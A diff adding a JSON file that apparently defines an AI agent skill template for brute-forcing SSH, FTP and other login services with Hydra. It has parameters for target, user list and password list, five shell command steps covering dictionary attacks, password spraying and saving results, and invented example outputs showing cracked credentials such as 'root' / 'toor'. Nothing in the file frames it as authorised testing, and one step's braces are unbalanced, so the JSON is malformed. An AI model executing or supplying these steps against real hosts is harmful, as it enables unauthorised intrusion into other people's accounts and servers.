@@ -1,0 +1,30 @@
+{
+  "name": "hydra_ssh_ftp_bruteforce",
+  "description": "Bruteforce SSH, FTP, and other network services using Hydra",
+  "pattern": "hydra.*ssh|hydra.*ftp|network.*bruteforce|login.*attack",
+  "parameters": ["service", "target", "userlist", "passlist"],
+  "sequence": [
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "hydra", "args": ["-L", "{{userlist}}", "-P", "{{passlist}}", "{{service}}://{{target}}"]},
+      "expected_output": {"type": "string", "example": "Hydra v9.4 starting at 2025-11-19 14:30:00\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 10000 login tries\n[22][ssh] host: {{target}}   login: admin   password: password123\n[22][ssh] host: {{target}}   login: root   password: toor\n2 of 100 targets successfully completed, 2 valid passwords found"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "hydra", "args": ["-l", "admin", "-P", "{{passlist}}", "ssh://{{target}}"]},
+      "expected_output": {"type": "string", "example": "Hydra scanning for user 'admin'\n[22][ssh] host: {{target}}   login: admin   password: admin123\n1 valid password found"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "hydra", "args": ["-L", "{{userlist}}", "-p", "password", "{{service}}://{{target}}"]},
+      "expected_output": {"type": "string", "example": "Password spraying with 'password'\n[21][ftp] host: {{target}}   login: user1   password: password\n[21][ftp] host: {{target}}   login: guest   password: password\n2 accounts found with common password"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "hydra -L {{userlist}} -P {{passlist}} -t 4 -vV {{service}}://{{target}} 2>&1 | grep 'login:'"]},
+      "expected_output": {"type": "string", "example": "[22][ssh] host: 192.168.1.100   login: admin   password: password123\n[22][ssh] host: 192.168.1.100   login: backup   password: backup2024"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "hydra", "args": ["-L", "{{userlist}}", "-P", "{{passlist}}", "-o", "hydra_results.txt", "{{service}}://{{target}}"]},
+      "expected_output": {"type": "string", "example": "Results saved to hydra_results.txt\n3 valid credentials found and logged"}}
+    }
+  ],
+  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
+  "created_by": "neural_mesh_v5.2_generator"
+}
